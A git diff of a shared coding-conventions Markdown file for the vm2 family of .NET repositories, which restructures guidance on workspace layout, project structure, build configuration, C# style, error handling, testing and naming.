@@ -1,117 +1,72 @@
 # vm2 Shared Conventions
 
-<!-- TOC tocDepth:2..3 chapterDepth:2..6 -->
+<!-- length-review: keep together -- one shared conventions file, synced verbatim to every repo -->
+
+<!-- TOC tocDepth:2..4 chapterDepth:2..6 -->
 
 - [vm2 Shared Conventions](#vm2-shared-conventions)
+  - [Workspace and Repository](#workspace-and-repository)
+    - [Local Workspace](#local-workspace)
+    - [Project Structure](#project-structure)
+    - [Shared Content and Synchronization](#shared-content-and-synchronization)
+  - [Build](#build)
+    - [Build Configuration, TFMs, RIDs, and Preprocessor Symbols](#build-configuration-tfms-rids-and-preprocessor-symbols)
+    - [Dependency Management](#dependency-management)
+    - [AOT and Trimming](#aot-and-trimming)
+  - [Writing C#](#writing-c)
+    - [General C# Coding Conventions](#general-c-coding-conventions)
+      - [Naming](#naming)
+    - [Async](#async)
+    - [Error Handling](#error-handling)
+      - [`Result<T>` and railway-oriented programming (ROP)](#resultt-and-railway-oriented-programming-rop)
+      - [The `Do` / `TryDo` pattern](#the-do--trydo-pattern)
+    - [API surface vs. inner workings](#api-surface-vs-inner-workings)
+    - [Logging and Observability](#logging-and-observability)
+    - [Performance](#performance)
+    - [Security](#security)
+    - [Services](#services)
+  - [Verifying](#verifying)
+    - [Testing](#testing)
+    - [Performance Benchmarks](#performance-benchmarks)
+  - [Shipping](#shipping)
+    - [Git and PR Hygiene](#git-and-pr-hygiene)
+    - [CI / GitHub Actions](#ci--github-actions)
+      - [Quoting GitHub Actions Expressions in Shell Steps](#quoting-github-actions-expressions-in-shell-steps)
+      - [Escaping Free-Form Text in Workflow Commands](#escaping-free-form-text-in-workflow-commands)
+      - [GitHub Actions Expressions: `&&`/`||` Is Not If/Then/Else](#github-actions-expressions--is-not-ifthenelse)
+    - [Bash](#bash)
+  - [Documentation](#documentation)
+    - [Markdown](#markdown)
   - [For AI Coding Assistants](#for-ai-coding-assistants)
     - [Code Generation and File Editing](#code-generation-and-file-editing)
-    - [PR Review](#pr-review)
     - [Language and Writing Quality](#language-and-writing-quality)
-  - [Project Structure](#project-structure)
-  - [Local Workspace](#local-workspace)
-  - [Dependency Management](#dependency-management)
-  - [Bash](#bash)
-  - [General C# Coding Conventions](#general-c-coding-conventions)
-  - [Async](#async)
-  - [Services (if applicable)](#services-if-applicable)
-  - [Error Handling](#error-handling)
-    - [The `Do` / `TryDo` dual pattern](#the-do--trydo-dual-pattern)
-    - [`Result<T>` and railway-oriented programming (ROP)](#resultt-and-railway-oriented-programming-rop)
-    - [API surface vs. inner workings](#api-surface-vs-inner-workings)
-  - [Testing](#testing)
-  - [Performance Benchmarks](#performance-benchmarks)
-  - [Performance](#performance)
-  - [Security](#security)
-  - [Naming](#naming)
-  - [AOT and Trimming](#aot-and-trimming)
-  - [Git and PR Hygiene](#git-and-pr-hygiene)
-  - [Documentation](#documentation)
-  - [References](#references)
-    - [Markdown](#markdown)
-  - [File Modification](#file-modification)
-  - [CI / GitHub Actions](#ci--github-actions)
-    - [Quoting GitHub Actions Expressions in Shell Steps](#quoting-github-actions-expressions-in-shell-steps)
-    - [Escaping Free-Form Text in Workflow Commands](#escaping-free-form-text-in-workflow-commands)
-    - [GitHub Actions Expressions: `&&`/`||` Is Not If/Then/Else](#github-actions-expressions--is-not-ifthenelse)
-  - [Build Configuration, TFMs, RIDs, and Preprocessor Symbols](#build-configuration-tfms-rids-and-preprocessor-symbols)
 
 <!-- /TOC -->
 
-The *vm2* family of repositories (packages, solutions, etc.) **share a common set of conventions** for the directory
-structure, project structure, coding style, documentation style, Git and PR hygiene, and more. This file documents these
-shared conventions to ensure **consistency across all repositories** and to provide guidance for contributors.
+The *vm2* family of repositories (packages, solutions, etc.) **share a common set of conventions** for the directory structure,
+project structure, coding style, documentation style, Git and PR hygiene, and more. This file documents these shared conventions
+to ensure **consistency across all repositories** and to provide guidance for contributors.
 
 The key words **MUST**, **MUST NOT**, **SHOULD**, **SHOULD NOT**, and **MAY** in this document are to be interpreted as
 described in [RFC 2119](https://www.rfc-editor.org/rfc/rfc2119).
 
 > [!IMPORTANT]
-> **These are defaults with reasons, not dogma.** Always question a rule rather than obey it reflexively: a rule
-> earns the burden of proof for *following* it, and an exception earns the burden of proof for *breaking* it — adjudicate
-> each case on its merits, not on the rule's authority. You **MAY** break any convention here when you can articulate why
-> its underlying reason does not apply to the case at hand — but you **MUST** record that rationale in writing (a code
-> comment, the `CLAUDE.md`, or the PR description), so the exception is a documented, auditable decision rather than
-> silent drift. An undocumented deviation is a violation; a documented, well-argued one is the process working.
+> **These are defaults with reasons, not dogma.** Always question a rule rather than obey it reflexively: a rule earns the
+> burden of proof for *following* it, and an exception earns the burden of proof for *breaking* it — adjudicate each case on its
+> merits, not on the rule's authority. You **MAY** break any convention here when you can articulate why its underlying reason
+> does not apply to the case at hand — but you **MUST** record that rationale in writing (a code comment, the `CLAUDE.md`, or
+> the PR description), so the exception is a documented, auditable decision rather than silent drift. An undocumented deviation
+> is a violation; a documented, well-argued one is the process working.
+>
 
 > [!NOTE]
-> This file is **copied identically to each repo's `.github/` directory** via `diff-shared.sh`.
-> The canonical source of truth is `vm2.Templates/templates/AddNewPackage/content/.github/CONVENTIONS.md`.
-> **Edit the canonical copy first**, then propagate with `diff-shared.sh`.
-> Repo-specific overrides belong in `CLAUDE.md` and `copilot-instructions.md`, not here.
+> This file is **copied *identically* to each repo's `.github/` directory** via `diff-shared.sh`. The canonical source of truth is
+> `vm2.Templates/templates/AddNewPackage/content/.github/CONVENTIONS.md`. **Edit the canonical copy first**, then propagate with
+> `diff-shared.sh`. Repo-specific overrides belong in `CLAUDE.md` and possibly in `copilot-instructions.md`, not here.
 
-## For AI Coding Assistants
+## Workspace and Repository
 
-This section consolidates instructions specifically for AI coding assistants (Claude, Copilot, etc.). The conventions
-in the rest of this document apply to all contributors — human and AI alike.
-
-### Code Generation and File Editing
-
-- **Wrap complete generated Markdown files in tilde fences** (`~~~markdown`) so the user can copy them cleanly
-- **Align Markdown table columns with spaces** so the table is readable in raw Markdown, not only in the rendered view
-- Do not remove commented-out code or configuration comments without explicit permission; feel free to *suggest* removal
-- Preserve YAML/JSON/XML comments in configuration files
-- For GitHub Actions workflows: preserve commented-out alternatives and explanatory notes
-- When adding new code, comment on *why* it exists — non-obvious constraints, invariants, workarounds, TODOs with context
-- When refactoring, update affected comments to maintain accuracy
-
-### PR Review
-
-- If a PR addresses more than one logical concern, **reject it** and request that it be split — do not approve or suggest
-  improvements until the scope is reduced to one concern
-
-### Language and Writing Quality
-
-The project owner is a non-native English speaker.
-
-- Always check spelling, grammar, and technical English in all documentation and comments
-- Recommend better, idiomatic wording for unclear, passive, or awkward sentences
-- Prefer active voice
-- Explain why a suggested change improves the text
-- When suggesting a correction, add one short sentence stating exactly what changed and why — especially for small edits
-  such as punctuation, articles, or word order
-- Examples:
-  - ❌ "The pattern is being matched by the enumerator"
-  - ✅ "The enumerator matches the pattern"
-
-## Project Structure
-
-- Solutions: **`.slnx` format** (Visual Studio 2022+)
-- `Directory.Build.props` for shared build settings
-- `Directory.Packages.props` for centralized package version management
-- Project files: **SDK-style**
-- Global usings: defined in **`usings.cs`** per project
-- Standard folder layout:
-  - `src/` — source code for deliverables
-  - `tests/` — test projects (xUnit v3, FluentAssertions, NSubstitute, MTP v2, Coverlet)
-  - `benchmarks/` — BenchmarkDotNet projects (desirable)
-  - `examples/` — usage examples (desirable; prefer single-file programs)
-  - `docs/` — documentation beyond README.md (optional)
-  - `.github/`
-    - AI-specific guidance and conventions (`CONVENTIONS.md` and/or `copilot-instructions.md`)
-    - dependabot configuration (`dependabot.yml`)
-    - issue and pull request templates (`ISSUE_TEMPLATE/` and `PULL_REQUEST_TEMPLATE.md`)
-  - `.github/workflows/` — GitHub Actions CI/CD (`CI.yaml`, `Prerelease.yaml`, `Release.yaml`, `RefreshLockFiles.yaml`, `AutoMerge.yaml`, `ClearCache.yaml`, `RebuildBenchHistory.yaml`)
-
-## Local Workspace
+### Local Workspace
 
 The vm2.DevOps tools assume one shared workstation layout:
 
@@ -120,270 +75,109 @@ The vm2.DevOps tools assume one shared workstation layout:
 - **`$VM2_REPOS`: one directory that contains all vm2 clones side by side** (default `$HOME/repos/vm2`). Export it in
   your shell profile, e.g. `export VM2_REPOS="$HOME/repos/vm2"` in `~/.bashrc`. The scripts resolve it from
   `--vm2-repos`, then `$VM2_REPOS`, then the parent of the vm2.DevOps clone, then the default; the vm2.Templates
-  post-actions use `$VM2_REPOS` directly, so it MUST be exported.
+  post-actions use `$VM2_REPOS` directly, so it **MUST** be exported.
 - **vm2.DevOps and vm2.Templates MUST be cloned into `$VM2_REPOS`.** Most tools also require both to be on `main`,
   clean, and up to date with `origin/main`; `--current-branch` relaxes that for testing only.
-- **Repository identity: the GitHub repository name is the source of truth.** A local clone's directory MUST have exactly
-  the same name as its GitHub repository, including case. Clone with `git clone https://github.com/vmelamed/<repo>.git`,
-  without a directory argument, into `$VM2_REPOS` (e.g. `$VM2_REPOS/vm2.Ulid`). The vm2.DevOps tools that work across
-  repositories read their list from `vm2_repositories` (`scripts/bash/lib/_constants.sh`) and use each entry both as the
-  directory name under `$VM2_REPOS` and as the GitHub repository name, so a clone under a different name is skipped by
-  some of them and mis-addressed by others. Compare the names case-sensitively: GitHub resolves repository names
+- **Repository identity: the GitHub repository name is the source of truth.** A local clone's directory **MUST** have exactly
+  the same name as its GitHub repository, including case. Clone with `git clone https://github.com/vmelamed/<repo>.git` (HTTPS)
+  or `git clone git@github.com:vmelamed/<repo>.git` (SSH) **without the &lt;directory&gt; argument**. The vm2.DevOps tools that
+  work across repositories read their repo list from `$vm2_repositories` (`scripts/bash/lib/_constants.sh`) and use each entry
+  both as the directory name under `$VM2_REPOS` and as the GitHub repository name, so a clone under a different name is skipped
+  by some of them and mis-addressed by others. Compare the names case-sensitively: GitHub resolves repository names
   case-insensitively, but Linux file systems do not.
 
-## Dependency Management
+### Project Structure
 
-- **Use `Directory.Build.props` and `Directory.Packages.props`** for shared build configuration and centralized package
-  version management; `*.csproj` files reference packages without versions
-- **Restore with `dotnet restore --use-lock-file`** to pin exact versions; commit `packages.lock.json`
-- **Build with `dotnet restore --use-lock-file ... && dotnet build --no-restore ...`**
-- When dependencies change: update `Directory.Packages.props`, **AND** then run `dotnet restore --force-evaluate`, commit both files
-- Dependabot watches `Directory.Packages.props`; after merging a Dependabot PR, run `dotnet restore --force-evaluate` (also done by `RefreshLockFiles.yaml` and `AutoMerge.yaml`)
-
-## Bash
-
-Bash is written and maintained almost entirely in `vm2.DevOps` — its shared function-parameter-validation patterns,
-argument-dispatcher ordering rules, the `&&`/`||` precedence pitfall, and the long-form-options convention now live in
-**[`vm2.DevOps/CLAUDE.md`](https://github.com/vmelamed/vm2.DevOps/blob/main/CLAUDE.md)**, alongside the rest of that
-repo's bash library documentation, rather than being duplicated here for every C#-only consumer repo.
-
-## General C# Coding Conventions
-
-- **See the repo's `.editorconfig` first** — it is authoritative for style and analyzers
-- File-scoped namespaces
-- Implicit usings for common namespaces (defined in `usings.cs`) or `<Using Include="..." />` in `*.csproj` and `Directory.Build.props`
-- `record` for immutable data models and DTOs
-- `readonly record struct` for small immutable value objects (e.g. `Ulid`, `Result<T>`)
-- `internal` by default; **`public` only for intentional API surface**. For referencing internal classes and members from say test projects, use the `InternalsVisibleTo` attribute rather than making them `public`
-- `sealed` by default; open **only** when extensibility is required and justified
-- **Instance methods for a type's own algebra; extension methods only to adapt what you don't own.** A method's
-  natural home is *inside* the type when the type is yours and the method is part of its core behavior — it gets direct
-  access to private state (no widening the public surface just to feed a helper), it is discoverable on `.` without an
-  import, and the type's behavior stays cohesive in one file. Reach for an **extension method** when, and only when:
-  - the receiver is a type you **do not own** (`Task<T>`, `IEnumerable<T>`, `Func<>`, `Nullable<T>`, a third-party type)
-    — you *cannot* add an instance method, so lifting/adapting it (`.MapAsync`, `.Traverse`, `.ToResult`) must be an
-    extension. This is why LINQ and most FP combinators over BCL types are extensions;
-  - the operation is defined over a **pattern across several types** rather than one type (`Traverse`, `Sequence`,
-    `Apply`), so no single type is its home.
-
-  Do **not** scatter a type's own core operations (e.g. `Option<T>.Map`/`Bind`, `Result<T>.Ensure`/`Tap`) into external
-  static classes; keep them inside the type. When extensions are unavoidable, group them in one clearly named static
-  class per concern (`OptionExtensions`, `ResultAsyncExtensions`) so the out-of-type code is organized, not sprinkled.
-- **Compose, don't impersonate.** A type MUST NOT implement an interface (or expose a conversion) merely to borrow the
-  ergonomics that come with *being* that thing when it is not semantically that thing. Gain a capability from the
-  *method shapes* the feature actually requires, not from a false `is-a`. For example, support LINQ query syntax over a
-  monad by giving it `Select`/`SelectMany`/`Where` **methods** rather than implementing `IEnumerable<T>` — a monad
-  (`Option<T>`, `Result<T>`, `Task<T>`) is **not** a collection, and claiming to be one floods its surface with
-  meaningless operators (`OrderBy`, `Zip`, `Chunk`), re-opens throwing extractors (`First`, `Single`) that bypass the
-  type's own safety, and boxes the value. This is distinct from *prefer composition over inheritance*: that rule governs
-  implementation **reuse** (`has-a` over `extends-a`); this one governs interface **honesty** (do not advertise an
-  identity you do not have).
-- Expression-bodied members when trivial and readable (one-liners, simple getters)
-- `var` when the type is obvious from the right-hand side
-- **Nullable reference types always enabled**; treat warnings as design feedback
-- **No static mutable state** unless guarded with proper synchronization (prefer `ReaderWriterLockSlim`)
-- Prefer `[GeneratedRegex(...)]` partial methods over `new Regex(..., RegexOptions.Compiled)` for static patterns
-- **Dependency injection** over service locator
-- Use `System.TimeProvider` (.NET 8+) for time abstraction; `FakeTimeProvider` in tests — **never** a homegrown `IClock`
-- Guard clauses at method entry (throw early; no nested pyramids)
-- All public interfaces must validate their input parameters and throw appropriate exceptions (e.g., `ArgumentNullException`, `ArgumentException`) for invalid arguments even if nullable references are enabled
-- Pattern matching (`is`, `switch` expressions) over `if`/`else` chains when semantically clearer
-- No curly braces for single-line blocks unless they improve readability
-- `#region` / `#endregion` acceptable for logical grouping in larger files and for interface implementations
-- EBNF (ISO 14977) for grammar definitions: `=` definitions, `,` concatenation, `;` terminator, `[ ]` optional,
-  `|` alternation, `"..."` terminals
-
-## Async
-
-- Async methods suffixed with `Async`
-- `CancellationToken ct` **threaded through all async call chains**
-- **No fire-and-forget** except documented background operations with proper error handling and logging
-- `ValueTask` only when allocation reduction is measurable (hot paths, cached results)
-- **Async-only for I/O-bound surfaces.** Where an operation is genuinely I/O-bound, expose **only** the async form — no
-  synchronous twin. The only way to offer a sync twin over an async internal is sync-over-async (`.Result` /
-  `.GetAwaiter().GetResult()`), which risks thread-pool starvation and deadlocks; refusing the sync twin is refusing to
-  ship that hazard. (Precedent: the EF Core Cosmos DB provider is async-only and throws on synchronous calls.)
-- Scope the rule to genuinely I/O-bound work. Code MUST NOT fake async over CPU-bound or in-memory work (no `Task.Run`
-  wrappers to present an async face); pure-computation packages stay synchronous.
-- An inherited or otherwise unavoidable synchronous seam (e.g. a sync interface member the type MUST implement) MUST throw
-  a clear usage exception (e.g. "this API is async-only; call `…Async`"), never silently block via sync-over-async.
-- Prefer the asynchronous BCL interfaces — `IAsyncDisposable` over `IDisposable`, `IAsyncEnumerable<T>` over
-  `IEnumerable<T>` — so async-only surfaces have no synchronous dead ends.
-- A library MUST NOT ship sync-over-async on a consumer's behalf. A consumer trapped in an inherently synchronous context
-  owns that bridge; the library does not relocate the hazard into itself.
-
-## Services (if applicable)
-
-- Prefer async APIs even when the current implementation is synchronous — avoids breaking changes later
-- Within a cluster, prefer gRPC and messaging over HTTP/REST for performance and reliability
-
-## Error Handling
-
-**The governing rule — exceptions guard the contract; results carry outcomes:**
-
-> An **exception** means *the caller or the environment is broken*: a precondition was violated (a caller bug) or the
-> machine failed (a catastrophe). A **`Result<T>`** means *the operation executed correctly and legitimately did not
-> succeed* — a normal alternate outcome the caller is expected to branch on.
-
-The deciding axis is **contractual outcome vs. contract violation**, **NOT** *recoverable vs. unrecoverable*. A failure
-MAY be unrecoverable and still be a `Result` (for signature visibility, allocation cost, and error accumulation); a
-failure MAY be trivially recoverable and still be an exception, because it was a caller bug.
-
-- Expected, correct-usage failures (not-found, business-invariant violation, etc.) SHOULD be modeled as `Result<T>`.
-- Caller mistakes — invalid arguments, violated preconditions the caller could have checked upfront, API misuse — MUST
-  throw (the `ArgumentException` family). Fail fast and loud; these are bugs, not outcomes. This is **argument
-  validation** and is distinct from **invariant validation** (below), which returns a `Result`.
-- Unrecoverable or catastrophic failures (I/O loss, OOM) MUST propagate to a single top-level boundary handler. Code MUST
-  NOT wrap every call in `try`/`catch`, and MUST NOT catch `Exception` to repackage it as a `Result` — that hides bugs
-  and catastrophes that MUST surface loudly. Convert an exception to a `Result` only at a specific boundary, catching a
-  **specific, known** exception type that represents an expected outcome (e.g. via a `Try(...)` combinator).
-- **Never use exceptions for expected control flow.** **Never swallow exceptions** — at minimum log or rethrow.
-- **Never log sensitive data** (PII, secrets). **Use logger scopes** for context; never string concatenation in messages.
-- **Prefer `ILogger<T>`** with structured logging.
-- In services: prefer circuit breakers and retries over exceptions for transient faults; a transient fault handled by a
-  resilience pipeline (e.g. optimistic-concurrency retry) MAY be surfaced as an exception, because the resilience layer
-  is exception-shaped.
-- In services: use health checks and OpenTelemetry for observability, not exceptions.
-
-### The `Do` / `TryDo` dual pattern
-
-When an operation's failure may be *either* a caller bug *or* an expected outcome depending on the call site, expose
-**both** forms (generalizing `Parse` / `TryParse`):
-
-- `Do(...)` — the bare-named method THROWS on failure. Use at **trusted internal call sites** where a failure is a bug.
-  The thrown exception SHOULD carry the full failure detail (e.g. every validation failure, like a good parser).
-- `TryDo(...)` — returns `Result<T>` (or `Result`). Use at **boundaries** (untrusted input, optional presence) where a
-  failure is an expected outcome to branch on.
-
-Concrete instances: `Validate` / `TryValidate`, `Find` / `TryFind`, `Get` / `TryGet`. The dual form makes the functional
-dependency **opt-in**: a consumer who does not want railway-oriented code uses the throwing `Do` form, catches ordinary
-exceptions, and never references `vm2.Functional`; `TryDo` is for consumers who opt into `Result`.
-
-### `Result<T>` and railway-oriented programming (ROP)
-
-- `Result<T>` and its `Error` hierarchy live in **`vm2.Functional`**. `Result<T>` is a `readonly record struct`; `Error`
-  is a polymorphic class hierarchy matched (via `switch`) at the boundary — the ROP analogue of a `catch` series.
-- Compose fallible steps with combinators (`Bind`, `Map`, `Ensure`, `Tap`, `Match`). The upstream-failure short-circuit
-  MUST live in the combinators, written once; business functions take the **unwrapped** value and return `Result<T>`,
-  and MUST NOT re-check upstream failure. `Match` is the only place a pipeline leaves the rails.
-- Invariant validation MUST accumulate **all** failures into one aggregate `Error` (applicative), not just the first.
-- An `Error.Code`, when present, is a **stable, external contract** for consumers that cannot see the CLR type (API
-  clients, localization, telemetry). Namespace it as `<resource>.<kind>` (e.g. `order.not_found`, `file.not_found`) and
-  match its granularity to how consumers branch. Derive it from a stable **domain term**, NEVER from the CLR type name;
-  omit it entirely for purely internal errors (discriminate by type instead). For coarse in-process handling shared
-  across several codes, use a marker interface (e.g. `INotFoundError`) alongside the specific `Code`.
-
-### API surface vs. inner workings
-
-- Opinionated third-party libraries (e.g. FluentValidation) are **implementation details**. They MUST NOT appear on the
-  public surface; wrap them behind a clean vm2 interface (`IValidatable`) so consumers see `Result` / `Validate`, never
-  the library's vocabulary.
-- The public surface MUST expose only vm2-owned outcome types (`Result<T>`, `Error`). Code MUST NOT surface a
-  third-party `Result` / `Either` / `OneOf` type — its version bumps would become your breaking changes.
-- A type on a **published** API surface is a binary-compatibility commitment. A `vm2.Functional` type MUST be stabilized
-  (shape locked, edge cases such as the `default(Result<T>)` state decided, tests in place) **before** it appears on a
-  published signature.
-- Async surfaces are `ValueTask<Result<T>>` / `Task<Result<T>>`; the async combinator family (`BindAsync`, `MapAsync`,
-  `EnsureAsync`) MUST be provided so the double-wrapped result composes without hand-unwrapping.
-
-## Testing
-
-- Framework: **xUnit v3 with Microsoft Testing Platform (MTP) v2**
-- Assertions: **FluentAssertions** (never `Assert.*` unless framework-specific)
-- Mocks: **NSubstitute**
-- Use **vm2.TestUtilities**:
-  - `TestUtilities.PathLine()` — locates failing theory tests
-  - `XUnitLogger` — captures structured logs without a real logger
-  - `TestBase` — inherit `ITestOutputHelper Out`, suppress FluentAssertions licensing noise, get `FluentAssertionsExceptionFormatter`
-- Test naming:
-  - Sync:  `MethodName_WhenCondition_ShouldOutcome`
-  - Async: `MethodName_WhenCondition_ShouldOutcome_Async`
-- Arrange / Act / Assert with clear blank-line separation
-- One logical assertion per test (chained FluentAssertions counts as one)
-- Prefer `[Theory]` with inline data; use `[MemberData]` or `[ClassData]` for complex scenarios
-- No testing of implementation details; mock only observable behavior
-- `[Trait("Category","Integration")]` for slow or external-dependency tests
-- Inject mock clock, e.g., `FakeTimeProvider` — never `DateTime.UtcNow` directly in tests
-- Inject mock ID providers — never rely on live generation in tests
-- Mock only external collaborators (I/O, time, random, repository, bus); never mock value objects
-- Strive for 80% code coverage on critical paths; prioritize meaningful tests over coverage numbers
-- Upload coverage to Codecov
-- **Equality-contract tests for every value type.** Any type that defines value equality (`record`,
-  `record struct`, or a `struct`/`class` overriding `Equals`/`GetHashCode`/`==`) **MUST** have tests pinning the
-  contract: reflexivity, symmetry, transitivity, `Equals`/`==` agreement, and `GetHashCode` consistency (equal
-  values hash equal). A type that is **not** meant to be compared MUST make that explicit (do not silently rely on
-  the reflection-based `ValueType.Equals` fallback — it boxes and is a hidden performance trap). This applies to
-  domain value objects and to library primitives alike.
-- **Algebraic-law tests for every monadic (or otherwise law-bearing) type.** A type that claims to be a monad,
-  functor, applicative, monoid, etc. **MUST** have tests proving the corresponding laws hold — for a monad: functor
-  identity (`m.Map(x => x) == m`), left identity (`Return(a).Bind(f) == f(a)`), right identity (`m.Bind(Return) == m`),
-  associativity, and `Map`/`Bind` consistency (`m.Map(f) == m.Bind(x => Return(f(x)))`). These are trivial to verify
-  for simple types and essential for complex ones (e.g. a parser's `Bind`); write them **regardless**, as executable
-  specification. Prefer `[Theory]` with representative functions/inputs for simple types; reach for property-based
-  generation (FsCheck/CsCheck) where the input space is large.
-
-## Performance Benchmarks
-
-- Framework: **BenchmarkDotNet**
-- Derive from `BenchmarkBase` to inherit consistent `MemoryDiagnoser`, `GcServer`, and other attributes
-- Benchmark hot paths and critical scenarios, not every method
-- Use `GlobalSetup` for expensive initialization; `IterationSetup` for per-iteration setup
-- Use `Params` for parameterized benchmarks to compare inputs
-- Upload results to Bencher for regression tracking
-
-## Performance
-
-- `AsNoTracking()` for read-only EF queries
-- Prefer lazy evaluation with iterators (`yield return`) over eager materialization for sequences
-- Prefer lazy initialization (`Lazy<T>`, `Lazy<T>(LazyThreadSafetyMode.*)`) for expensive objects
-- No unnecessary `ToList()` inside query pipelines
-- `ReadOnlySpan<char>` for parsing hot paths
-- `stackalloc` for small buffers with heap fallback for large inputs
-
-## Security
-
-- No embedded secrets — secure storage, user secrets, or environment variables only
-- Validate all external inputs at system boundaries
-- Principle of least privilege throughout
-- Prefer quantum-resistant algorithms for cryptography where applicable
-
-## Naming
-
-- Events: past tense — `OrderPlacedEvent`
-- Commands: imperative — `PlaceOrderCommand`
-- Handlers: `...Handler` suffix
-- Prefer **domain-first public API type names** without suffixes unless required to avoid symbol conflicts
+- Solutions: **`.slnx` format** (Visual Studio 2022+ and Visual Studio Code)
+- `Directory.Build.props` for shared build settings
+- `Directory.Packages.props` for centralized package version management
+- Project files: **SDK-style**
+- Global usings: defined in **`usings.cs`** per project
+- Standard folder layout:
+  - `src/` — source code for deliverables
+  - `tests/` — test projects (xUnit v3, FluentAssertions, NSubstitute, MTP v2)
+  - `benchmarks/` — BenchmarkDotNet projects (desirable)
+  - `examples/` — usage examples (desirable; prefer single-file programs)
+  - `docs/` — documentation beyond README.md (optional)
+  - `.github/` — GitHub-specific files and configs
+    - AI-specific guidance and conventions (`CONVENTIONS.md` and/or `copilot-instructions.md`)
+    - dependabot configuration (`dependabot.yml`)
+    - pull request templates (`PULL_REQUEST_TEMPLATE.md`)
+  - `.github/workflows/` — GitHub Actions CI/CD (`CI.yaml`, `Prerelease.yaml`, `Release.yaml`, `RefreshLockFiles.yaml`,
+    `AutoMerge.yaml`, `ClearCache.yaml`, `RebuildBenchHistory.yaml`)
 - **Package-first artifact identity**:
   - Package ID: `vm2.<Package>` or `vm2.<Package>.<Feature>`
   - Assembly name: `vm2.<Package>` or `vm2.<Package>.<Feature>`
 - Repository names: see [Local Workspace](#local-workspace) — the GitHub repository name is the source of truth
 - **Always set `<RootNamespace>` explicitly** in every `*.csproj`
 - **Always set `<OutputType>` explicitly** in every `*.csproj`
-- Test projects — assembly: `<Package>.Tests`; namespace: `vm2.Tests.<Package>[.<Feature>]`. Note the placement of the `Tests` segment and the mirroring of the assembly structure: it helps avoiding symbol conflicts. Always `<OutputType>Exe</OutputType>` - xUnit v3 + MTP v2.
-- Benchmark projects — assembly: `<Package>.Benchmarks`; namespace: `vm2.Benchmarks.<Package>[.<Feature>]`. Note the placement of the `Benchmarks` segment and the mirroring of the assembly structure: it helps avoiding symbol conflicts. Always `<OutputType>Exe</OutputType>` - BenchmarkDotNet requires the default name for the entry point assembly.
+- Test projects — assembly: `<Package>.Tests`; namespace: `vm2.Tests.<Package>[.<Feature>]`. Note the placement of the `Tests`
+  segment and the mirroring of the assembly structure: it helps avoid symbol conflicts. Always `<OutputType>Exe</OutputType>`
+  for xUnit v3 + MTP v2.
+- Benchmark projects — assembly: `<Package>.Benchmarks`; namespace: `vm2.Benchmarks.<Package>[.<Feature>]`. Note the placement
+  of the `Benchmarks` segment and the mirroring of the assembly structure: it helps avoid symbol conflicts. Always use
+  `<OutputType>Exe</OutputType>` for benchmark projects using BenchmarkDotNet. BenchmarkDotNet requires benchmarks to live in a
+  console application.
 - Do not mix naming strategies within a single repository
-- **Use a URN for the unique identifier of a resource that we own and define** — an XML schema or namespace, a
-  serialization format, an encryption key, an organizational resource, etc. (e.g. `urn:schemas-vm-com:Linq-Expressions-Serialization-Json`).
-  A URN names the resource without implying it can be retrieved over the network, which a URL does. Storage keys are a
-  separate choice: a database key is usually a ULID or GUID, and the URN can serve as the external, human-meaningful identity.
-- **Identifiers of shared, registered dialects keep their official form.** A JSON Schema's `$schema` must be the
-  registered meta-schema URI (e.g. `https://json-schema.org/draft/2020-12/schema`), because validators match that exact
-  string. Replacing it with a repository URN would prevent the dialect from being recognized.
-- **Fetchability is a security decision, not a naming one.** Some schema and XML tooling automatically dereferences a
-  `$schema`, `$ref`, or namespace URI found in a document. That is the same class of hazard as XXE in XML parsers: an
-  attacker-influenced or later-hijacked URL can become an SSRF vector (an internal service, a cloud metadata endpoint,
-  a `file://` path) the moment such a tool processes the file. Resolve identifiers through an explicit,
-  developer-controlled mapping (e.g. VSCode's `json.schemas` setting, matched by file glob), not an implicit network call.
-- **Any other `http(s)://` identifier used for a resource MUST be justified** with a comment or documentation explaining
-  why it is needed and why automatic fetching is safe there.
 
-## AOT and Trimming
+### Shared Content and Synchronization
+
+- **Edit shared files at their canonical source, never in a consumer repo.** Files synced by `diff-shared.sh` (mapped in
+  `diff-shared.config.json`) are sourced from `vm2.Templates` (the `AddNewPackage` content). Edit the canonical copy
+  first, then propagate with `diff-shared.sh`. See vm2.Templates/templates/AddNewPackage/content/diff-shared.config.json for
+  default configuration details. The configuration can be overridden in the other repos in a `diff-shared.custom.json` file.
+
+## Build
+
+### Build Configuration, TFMs, RIDs, and Preprocessor Symbols
+
+- **`Directory.Build.props` is the single source of truth for `TargetFramework` and the artifacts output layout**
+  (`ArtifactsPath`, `UseArtifactsOutput`). Workflows and scripts **MUST NOT** duplicate or override these — they read build
+  output locations, they do not decide them. This extends to every CLI flag and environment variable that threads one of these
+  build-controlled values through a script (`--configuration`/`CONFIGURATION`, `--framework`/`FRAMEWORK`, `--runtime`/`RUNTIME`,
+  `--artifacts-path`/`ARTIFACTS_PATH`, and any `dotnet-version`/`target-framework` workflow input): these exist as escape valves
+  for a rare, deliberate exception, not as a general-purpose override mechanism. If a script or workflow ends up setting one of
+  these to something other than its resolved default, that **MUST** be justified in writing — a comment at the override site, or
+  the PR description — not merely "because the parameter is there." `Configuration`'s own narrow exception (below) is the model
+  to follow: a named, human-triggered escape hatch with a stated reason, not a value CI computes or forwards by default.
+  Conversely, an input or CLI flag that no caller ever sets to anything but the default is not a reserved knob — it is dead
+  weight that has silently drifted from what the workflow actually does; remove it rather than leave it standing.
+- **The Runtime Identifier (RID) is deliberately left unset (`""`) today.** Every package builds portable, framework-dependent,
+  OS/architecture-agnostic output — no `RuntimeIdentifier` is set anywhere. This is why `runner-os` (and the `runners-os` matrix
+  in `_ci.yaml`) currently only selects which OS *runs* the build/test/benchmark step; it has no effect on the artifact itself,
+  since the output is the same regardless of runner. **If AOT publishing is introduced, RID becomes mandatory and MUST be
+  derived from the runner**, not hardcoded once for all of them (e.g. `ubuntu-latest` → `linux-x64`,
+  `windows-latest` → `win-x64`, `macos-latest` → `osx-arm64`). Treat `runner-os` as the future RID axis already in place,
+  waiting for AOT to need it.
+- **`Configuration` defaults to `Release` and is defined in `Directory.Build.props`.** Workflow logic **MUST NOT** branch on or
+  override `Configuration`. There is currently no scenario that justifies CI choosing anything else.
+- **Warnings are errors.** `Directory.Build.props` sets `TreatWarningsAsErrors=true` and `AnalysisLevel=latest`. Fix a warning
+  rather than suppress it; a suppression **MUST** state its justification (`[SuppressMessage(..., Justification = "...")]`, or a
+  comment next to the `#pragma` or the `.editorconfig` entry).
+- **Keep the number of CI-driven preprocessor symbols to a minimum.** Today there is one symbol: `SHORT_RUN`, which is
+  auto-defined by `Directory.Build.props` for local benchmark builds and added explicitly in CI only for a `push` to a non-main
